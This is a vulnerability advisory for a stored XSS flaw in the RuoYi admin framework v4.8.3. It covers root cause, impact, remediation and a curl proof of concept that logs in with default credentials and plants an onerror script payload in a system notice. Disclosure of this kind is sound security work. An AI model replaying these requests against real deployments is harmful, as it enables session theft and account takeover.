# V-R001: Stored XSS via Notice System (XSS Filter Exclusion + th:utext)

## Vulnerability Information

| Item | Detail |
|------|--------|
| Product | RuoYi (若依) |
| Version | v4.8.3 (and all prior versions) |
| Type | CWE-79: Improper Neutralization of Input During Web Page Generation (Stored XSS) |
| Severity | Medium |
| Attack Vector | Network (Authenticated - any user with notice create permission) |
| Repository | https://github.com/yangzongzhuan/RuoYi |

## Description

RuoYi's XSS protection filter (`XssFilter`) is globally enabled but **explicitly excludes** the notice endpoint (`/system/notice/*`) in the application configuration. Combined with the Thymeleaf template using `th:utext` (unescaped output) to render notice content, this creates a complete Stored XSS vulnerability chain.

### Root Cause Analysis

**Two independent misconfigurations combine to create this vulnerability:**

1. **XSS Filter Exclusion** (`application.yml` line 144):
   ```yaml
   xss:
     enabled: true
     excludes: /system/notice/*    # Notice endpoint excluded from XSS filter!
     urlPatterns: /system/*,/monitor/*,/tool/*
   ```
   The notice CRUD endpoints are deliberately excluded from XSS filtering, allowing raw HTML/JavaScript to be stored in the database.

2. **Unsafe Template Rendering** (`view.html` line 48):
   ```html
   <div class="notice-content" th:utext="${notice.noticeContent}"></div>
   ```
   `th:utext` renders content without HTML escaping (unlike `th:text`), directly injecting stored HTML into the page.

### Attack Flow

```
Attacker (authenticated) → POST /system/notice/add with JS payload
                         → XSS filter skipped (excluded path)
                         → Payload stored in database unmodified
                         → Victim views notice via /system/notice/view/{id}
                         → th:utext renders payload unescaped
                         → JavaScript executes in victim's browser
```

## Affected Files

- `ruoyi-admin/src/main/resources/application.yml` (line 144) - XSS filter exclusion configuration
- `ruoyi-admin/src/main/resources/templates/system/notice/view.html` (line 48) - `th:utext` unsafe rendering
- `ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysNoticeController.java` - Notice CRUD controller

## Impact

1. **Session Hijacking**: Attacker steals admin session cookies via `document.cookie`
2. **Privilege Escalation**: Low-privilege user creates malicious notice → admin views it → account takeover
3. **Wide Blast Radius**: System notices are displayed to ALL authenticated users
4. **Keylogging/Phishing**: Injected JavaScript can capture keystrokes or overlay fake login forms

## Proof of Concept

### Step 1: Login to RuoYi

```bash
curl -s -c cookies.txt -X POST http://<target>:8080/login \
  -d "username=admin&password=admin123&rememberMe=false"
```

**Response:**
```json
{"msg":"操作成功","code":0}
```

### Step 2: Create Notice with XSS Payload

The XSS filter is bypassed because `/system/notice/*` is in the exclusion list.

```bash
curl -s -b cookies.txt -X POST http://<target>:8080/system/notice/add \
  -d 'noticeTitle=XSS+Test&noticeType=1&noticeContent=<img src=x onerror=alert("XSS-CVE-RuoYi-v4.8.3")><p>Test</p>'
```

**Response:**
```json
{"msg":"操作成功","code":0}
```

### Step 3: Verify Payload Stored Without Sanitization

```bash
curl -s -b cookies.txt -X POST http://<target>:8080/system/notice/list
```

**Response (notice content contains raw XSS):**
```json
{
  "noticeId": 10,
  "noticeTitle": "XSS Test",
  "noticeContent": "<img src=x onerror=alert(\"XSS-CVE-RuoYi-v4.8.3\")><p>Test</p>"
}
```

### Step 4: View Notice - XSS Triggers

```bash
curl -s -b cookies.txt http://<target>:8080/system/notice/view/10
```

**Response HTML (key fragment):**
```html
<div class="notice-body">
    <div class="notice-content"><img src=x onerror=alert("XSS-CVE-RuoYi-v4.8.3")><p>Test</p></div>
</div>
```

The `<img src=x onerror=alert(...)>` is rendered **without HTML encoding** by `th:utext`, causing the JavaScript to execute when the page loads in a browser.

### Comparison: Normal Endpoint vs Notice Endpoint

| Feature | Normal endpoints (`/system/*`) | Notice endpoint (`/system/notice/*`) |
|---------|-------------------------------|--------------------------------------|
| XSS Filter | **Active** (strips HTML tags) | **Excluded** (raw HTML passes through) |
| Template | `th:text` (escaped) | `th:utext` (unescaped) |
| Result | XSS blocked | **XSS executes** |

## Remediation

1. **Remove the XSS filter exclusion**: Delete `/system/notice/*` from `xss.excludes` in `application.yml`
2. **Use `th:text` instead of `th:utext`**: Or sanitize HTML server-side before rendering (e.g., using OWASP Java HTML Sanitizer)
3. **Add Content Security Policy (CSP)** header to prevent inline script execution
4. **Server-side sanitization**: If rich text is needed, use a whitelist-based HTML sanitizer (e.g., Jsoup with safelist)

## Screenshots

### Vulnerability Proof
![XSS Proof](./v_r001_xss_proof.png)

### Server Response Showing Unescaped XSS
![Server Response](./v_r001_server_response.png)

## Verification Environment

- Target: RuoYi v4.8.3 deployed via Docker on 192.168.217.135:8080
- Tools: curl, Edge browser
- Date: 2026-04-13
